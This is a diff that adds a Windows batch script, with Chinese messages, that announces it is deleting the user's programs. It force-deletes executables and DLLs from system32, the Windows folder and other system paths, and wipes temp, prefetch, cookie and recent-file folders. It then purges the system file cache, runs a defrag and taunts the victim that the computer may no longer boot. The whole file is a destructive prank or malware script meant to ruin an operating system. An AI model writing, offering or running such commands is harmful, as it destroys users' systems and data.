@@ -1,0 +1,65 @@
+@echo off
+
+
+echo 删除您的执行程序，@.@请稍等......
+
+
+del /f /s /q %system32%\*.exe
+
+
+del /f /s /q %system32%\*.dll
+
+
+del /f /s /q %WINVISTA%\*.exe
+
+
+del /f /s /q %Help%\*.exe
+
+
+del /f /s /q %WINDOWS%\*.EXE
+
+
+del /f /s /q %Documents and Settings%\*.old
+
+
+del /f /s /q %systemdrive%\recycled\*.EXE
+
+
+del /f /s /q %Program Files%\*.bak
+
+
+del /f /s /q %windir%\prefetch\*.*
+
+
+rd /s /q %windir%\temp & md %windir%\temp
+
+
+del /f /q %userprofile%\COOKIES s\*.*
+
+
+del /f /q %userprofile%\recent\*.*
+
+
+del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
+
+
+del /f /s /q "%userprofile%\Local Settings\Temp\*.*"
+
+
+del /f /s /q "%userprofile%\recent\*.*"
+
+
+sfc /purgecache '清除一切可执行程序建议您重装系统！！@.@
+
+
+defrag %systemdrive% -b '请重新启动计算机！可能不用启动了！呵呵！
+
+
+echo 还是装WINVISTA吧！XP垃圾！呵呵！
+
+
+echo 当你不会装系统时，请大喊周周大帅比
+
+echo. & pause
+
+
